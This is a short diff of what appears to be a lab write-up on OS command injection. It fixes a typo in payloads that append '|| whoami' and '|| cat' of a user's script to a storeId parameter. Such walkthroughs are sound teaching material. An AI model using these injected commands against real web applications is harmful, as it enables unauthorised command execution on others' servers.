@@ -48,14 +48,14 @@ productId=1&storeId=1+%26+whoami
 
 > Trying the other operators:
 ```
-productId=1&storeId=1 S| whoami
+productId=1&storeId=1 || whoami
 ```
 
 ![whoami](./screenshots/whoami.png)
 
 > Now that we know this is vulnerable to command injection, we can try reading the script using `cat`.
 ```
-productId=1&storeId=1 S| cat /home/peter-LWQxu9/stockreport.sh
+productId=1&storeId=1 || cat /home/peter-LWQxu9/stockreport.sh
 ```
 
 ![script-res](./screenshots/script-res.png)
